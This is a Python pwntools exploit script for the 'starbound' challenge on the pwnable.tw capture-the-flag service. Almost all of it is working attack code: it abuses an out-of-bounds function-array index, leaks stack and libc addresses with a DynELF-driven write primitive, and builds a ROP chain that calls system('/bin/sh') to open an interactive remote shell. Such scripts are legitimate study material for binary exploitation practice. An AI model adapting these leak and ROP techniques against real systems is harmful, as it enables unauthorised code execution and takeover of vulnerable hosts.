from pwn import *

server = remote('chall.pwnable.tw', 10202)
elf = ELF('./starbound')
libc = ELF('/lib32/libc.so.6')

nptr = 0

def input_cmd(cmd):
    server.recvuntil('> ')
    server.send(cmd)

def tohex(val, nbits):
    return hex((val + (1 << nbits)) % (1 << nbits))

def leak(addr):
    server.recvuntil('> ')
    bss_func_array = 0x8058154
    offset = int(tohex(nptr - bss_func_array, 32), 16)
    payload = str(offset / 4 + len(str(offset)) / 4 + 2) + '\x01' + 'A'*5

    # esp -118h -> nptr -104h 0x14h+0x4(pushed addr) -> 0x18h
    # 0x18h+0x10h (payload) -> 0x28h
    # 0x28h - 0x1c - 4*0x4 - 0x4 = -0x08

    # payload can point to rop onw
    payload += p32(0x80496e0) # add esp, 0x1c; pop 4; ret
    payload += p32(0xdeadbee1) # -0x04
    payload += p32(elf.plt['write']) # -0x00
    payload += p32(0x80494da) # pop ebx, pop esi, pop edi, ret
    payload += p32(1) + p32(addr) + p32(4)

    payload += p32(elf.sym['main'])
  
    server.send(payload)
    
    data = server.recv(4)
    success('Leak address = ' + hex(addr))
    print hexdump(data)

    global nptr
    # 0xf0: after sub esp, 110h
    # 0x10: lea ebx, [esp+10h]
    nptr -= (0xf0 - 0x10)
    return data
    

bss_func_array = 0x8058154
puts_got = elf.got['puts']
info('puts@got')
offset = int(tohex(puts_got - bss_func_array, 32), 16)
# \x01: split for strtol


#pwndbg> hexdump 0xfff26fb0
#+0000 0xfff26fb0  31 30 37 33  37 33 38 37  30 36 01 31  31 31 31 31  |1073|7387|06.1|1111|
#+0010 0xfff26fc0  31 31 31 31  31 31 31 31  31 31 31 31  31 31 31 31  |1111|1111|1111|1111|
#...
#+0030 0xfff26fe0  31 31 31 31  31 31 31 31  31 31 31 31  68 70 f2 ff  |1111|1111|1111|hp..|

payload = str(offset / 4) + '\x01' + '1'*49
input_cmd(payload)

server.recvuntil('1'*49)
leak_stack = u32(server.recv(4))

success('leak stack = ' + hex(leak_stack))

# leak 8bd88 / nptr 8bcd0
global nptr
nptr = leak_stack - (0xbd88 - 0xbcd0)
info('nptr = ' + hex(nptr))

d = DynELF(leak, elf=elf, libcdb=False)
system = d.lookup('system', 'libc')
success('system = ' + hex(system))

# Build final rop
offset = int(tohex(nptr - bss_func_array, 32), 16)
payload = str(offset / 4 + len(str(offset)) / 4 + 2) + '\x01' + 'a'*5

payload += p32(0x80496e0) # add esp, 0x1c; pop 4; ret
payload += p32(0xdeadbeef) # -0x04
payload += p32(elf.plt['read']) # -0x00
payload += p32(0x80494da)
payload += p32(0)
payload += p32(0x08058800) # bss
payload += p32(0x20)
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(0x08058800)
server.send(payload)

server.send('/bin/sh\x00')

server.interactive()

